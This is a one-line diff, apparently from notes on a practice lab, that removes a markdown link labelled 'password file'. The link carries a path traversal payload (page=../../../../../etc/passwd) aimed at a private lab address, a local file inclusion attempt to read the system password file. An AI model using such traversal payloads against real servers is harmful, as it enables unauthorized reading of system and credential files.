@@ -1,1 +1,0 @@
-[password file](http://192.168.56.101/index.php?page=../../../../../etc/passwd)
